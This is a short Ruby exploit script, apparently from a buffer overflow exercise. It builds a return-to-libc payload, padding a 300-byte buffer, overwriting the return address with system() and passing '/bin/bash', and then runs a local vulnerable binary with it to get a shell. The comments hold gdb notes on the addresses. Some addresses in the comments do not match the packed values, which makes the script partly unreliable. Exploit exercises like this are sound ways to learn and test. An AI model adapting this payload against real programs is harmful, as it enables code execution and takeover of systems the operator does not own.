y#!/usr/bin/ruby

=begin
Create exploit string

Information:
&buf = (char (*)[300]) 0x7fffffffdde0
rbp            0x7fffffffdf10
0x0000000000400694 <+135>:       lea    -0x130(%rbp),%rax => 0x7fffffffddd0 => set "/bin/bash"
0x7fffffffdf50:       0x0000000000400520 <= return addr from main Here, we want to write address of system()
0x7fffffffdf40:0x20 0x05 0x40 0x00 0x00 0x00 0x00 0x00
system = 0x4004e0
=end
#bfffee54 + 324(14) = 
buf = ""
buf += 'A' * 300
buf += 'A' * 12
buf += ["90830408"].pack("H*") #=> address of system()
buf += 'AAAA'
buf += ["88efffbf"].pack("H*")
buf += "/bin/bash"
#buf += ["c55ea3f7ff7f"].pack("H*") #=> normal return addr
File.open("buf", "wb") do |file|
  file.write(buf)
end

#
# fork explot process!!
#
pid = fork do
  exec("./bof `cat buf`")
end

exitpid, status = *Process.waitpid2(pid)
